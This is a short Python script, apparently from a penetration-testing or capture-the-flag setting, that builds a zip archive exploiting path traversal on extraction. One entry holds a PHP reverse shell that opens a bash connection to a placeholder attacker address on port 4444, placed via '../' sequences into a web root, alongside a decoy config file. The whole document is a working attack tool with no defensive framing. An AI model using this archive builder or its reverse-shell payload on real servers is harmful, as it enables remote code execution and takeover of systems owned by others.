import zipfile
import io

reverse_shell = "<?php echo system(\"/bin/bash -c 'bash -i >& /dev/tcp/<ip>/4444 0>&1'\");?>"

mf = io.BytesIO()
with zipfile.ZipFile(mf, mode='w', compression=zipfile.ZIP_DEFLATED) as file:
    file.writestr('../../../../../../var/www/html/reverse.pht', str.encode(reverse_shell, "utf-8"))
    file.writestr('config.json', 'just the trash file, if you need to have some specific name in your zip')

with open("do_not_open.zip", "wb") as f:
    f.write(mf.getvalue())
